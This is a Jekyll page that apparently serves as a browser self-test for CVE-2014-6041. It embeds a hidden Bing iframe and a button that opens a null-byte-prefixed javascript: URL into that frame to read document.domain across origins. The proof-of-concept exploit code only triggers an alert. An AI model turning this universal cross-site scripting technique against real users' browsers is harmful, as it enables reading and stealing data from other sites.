---
layout: default
title: SOP Bypass - Testcase 9
permalink: /sop/new/9
---

# SOP Bypass - Testcase 9

Testing for SOP bypass using escape characters
<iframe height="0" width="0" name="CVE-2014-6041" src="https://web.archive.org/web/20180831120259if_/https://www.bing.com/" style="display:none;" data-ruffle-polyfilled=""></iframe>

<!-- Multiple buttons with different onclick events -->
<input type="button" id="btn_test" class="test" value="Run Test Case 1" onclick="window.open('\u0000javascript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">
<!-- ... additional buttons for other test cases ... -->

**Note:**
If page loads popup and displays an alert box "Accessed Property of bing.com, your browser is vulnerable to SOP bypass."
